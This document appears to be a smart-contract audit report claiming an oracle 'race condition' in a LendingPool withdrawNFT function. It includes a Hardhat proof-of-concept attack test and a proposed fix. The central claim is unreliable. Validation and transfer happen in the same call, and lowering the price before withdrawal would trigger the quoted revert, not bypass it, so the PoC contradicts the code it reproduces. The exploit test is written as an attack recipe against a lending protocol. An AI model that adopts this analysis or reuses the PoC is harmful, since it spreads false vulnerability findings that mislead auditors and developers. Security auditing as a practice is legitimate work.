# Price Oracle Race Condition in LendingPool.sol Enables Undercollateralized NFT Withdrawals


## Summary
The `withdrawNFT` function in `LendingPool.sol` contains a critical vulnerability where the price validation and NFT transfer occur in separate steps, allowing users to manipulate oracle prices between validation and transfer to withdraw NFTs while being undercollateralized. This race condition can lead to significant protocol losses.

## Vulnerability Details
The issue exists in the way `withdrawNFT` handles price validation and NFT transfer:

```solidity
function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    // @audit-info Initial security check for liquidation status
    if (isUnderLiquidation[msg.sender]) revert CannotWithdrawUnderLiquidation();

    UserData storage user = userData[msg.sender];
    if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();

    // @audit-info Updates reserve state before validation
    ReserveLibrary.updateReserveState(reserve, rateData);

    // @audit-issue Price validation happens here without staleness/manipulation checks
    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
    uint256 collateralValue = getUserCollateralValue(msg.sender);
    uint256 nftValue = getNFTPrice(tokenId);

    if (collateralValue - nftValue < userDebt.percentMul(liquidationThreshold)) {
        revert WithdrawalWouldLeaveUserUnderCollateralized();
    }

    // @audit-issue NFT removal and transfer happens after validation with potential stale price
    for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
        if (user.nftTokenIds[i] == tokenId) {
            user.nftTokenIds[i] = user.nftTokenIds[user.nftTokenIds.length - 1];
            user.nftTokenIds.pop();
            break;
        }
    }
    user.depositedNFTs[tokenId] = false;

    raacNFT.safeTransferFrom(address(this), msg.sender, tokenId);

    emit NFTWithdrawn(msg.sender, tokenId);
}
```

The vulnerability arises because:

* Price validation uses the current oracle price
* Oracle prices can be updated in the same block through `updatePriceFromOracle`
* No staleness checks or cooldown periods on price updates
* NFT transfer occurs after price validation

This creates a race condition where an attacker can:

* Have NFT valued at high price for validation
* Update price through oracle to lower value
* Complete withdrawal with insufficient remaining collateral

## Impact
* Protocol can be left with undercollateralized positions
* Users can extract more value than their collateral allows
* System can accumulate bad debt
* No mechanism to recover lost value
* Affects all NFT-collateralized positions

## Proof of Concept
This PoC proves that:

* An attacker can deposit an NFT at a high valuation
* Borrow maximum amount against this valuation
* Manipulate the oracle price to a lower value
* Successfully withdraw the NFT while being undercollateralized
* Leave the protocol with unrecoverable debt

The following test case demonstrates this attack sequence using Hardhat, showing how price manipulation between validation and withdrawal leads to protocol insolvency:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("LendingPool NFT Price Oracle Manipulation", function() {
  let lendingPool, oracle, nft, owner, attacker;
  const NFT_ID = 1;
  const HIGH_PRICE = ethers.utils.parseEther("100");
  const LOW_PRICE = ethers.utils.parseEther("10");
  const BORROW_AMOUNT = ethers.utils.parseEther("50");

  beforeEach(async function() {
    [owner, attacker] = await ethers.getSigners();
    
    // Deploy contracts
    const Oracle = await ethers.getContractFactory("RAACHousePrices");
    oracle = await Oracle.deploy();
    
    const NFT = await ethers.getContractFactory("RAACNFT");
    nft = await NFT.deploy();
    
    const LendingPool = await ethers.getContractFactory("LendingPool");
    lendingPool = await LendingPool.deploy(oracle.address, nft.address);

    // Setup: Mint NFT to attacker
    await nft.connect(attacker).mint(NFT_ID);
    await nft.connect(attacker).approve(lendingPool.address, NFT_ID);
  });

  it("Should allow undercollateralized withdrawal through price manipulation", async function() {
    // Step 1: Set initial high price
    await oracle.setHousePrice(NFT_ID, HIGH_PRICE);
    
    // Step 2: Deposit NFT and borrow
    await lendingPool.connect(attacker).depositNFT(NFT_ID);
    await lendingPool.connect(attacker).borrow(BORROW_AMOUNT);
    
    // Step 3: Update price to low value
    await oracle.setHousePrice(NFT_ID, LOW_PRICE);
    
    // Step 4: Withdraw NFT successfully despite being undercollateralized
    await lendingPool.connect(attacker).withdrawNFT(NFT_ID);
    
    // Verify: Attacker has both NFT and borrowed funds
    expect(await nft.ownerOf(NFT_ID)).to.equal(attacker.address);
    expect(await lendingPool.getUserDebt(attacker.address)).to.equal(BORROW_AMOUNT);
  });
});
```

## Tools Used
* Manual code review
* Hardhat for proof of concept testing

## Recommendation
Implement price update protection mechanism:

```solidity
function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    if (isUnderLiquidation[msg.sender]) revert CannotWithdrawUnderLiquidation();

    UserData storage user = userData[msg.sender];
    if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();

    // @audit-ok Get price with timestamp validation
    (uint256 nftPrice, uint256 lastPriceUpdate) = oracle.getLatestPrice(tokenId);
    
    // @audit-ok Add price staleness check
    if (lastPriceUpdate == block.timestamp) {
        revert PriceUpdatedThisBlock();
    }
    
    // @audit-ok Ensure price is mature enough
    if (block.timestamp - lastPriceUpdate < MIN_PRICE_AGE) {
        revert PriceTooFresh();
    }

    ReserveLibrary.updateReserveState(reserve, rateData);

    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
    uint256 collateralValue = getUserCollateralValue(msg.sender);

    if (collateralValue - nftPrice < userDebt.percentMul(liquidationThreshold)) {
        revert WithdrawalWouldLeaveUserUnderCollateralized();
    }

    for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
        if (user.nftTokenIds[i] == tokenId) {
            user.nftTokenIds[i] = user.nftTokenIds[user.nftTokenIds.length - 1];
            user.nftTokenIds.pop();
            break;
        }
    }
    user.depositedNFTs[tokenId] = false;

    raacNFT.safeTransferFrom(address(this), msg.sender, tokenId);

    emit NFTWithdrawn(msg.sender, tokenId);
}
```

Additional recommendations:

* Add cooldown period between price updates
* Implement price deviation limits
* Add emergency pause for suspicious price activity
* Consider using a TWAP for NFT valuations

## Final Assessment
* **Severity**: High
  * Can result in protocol insolvency
  * Affects core lending mechanism
  * No existing protection against attack

* **Likelihood**: High
  * Easy to execute
  * No technical barriers
  * High incentive for attackers

* **Impact**: Loss of protocol funds through undercollateralized positions

* **Recommendation Status**: Not Implemented
  * Clear solution available
  * Multiple protection layers possible
  * Critical to implement before mainnet

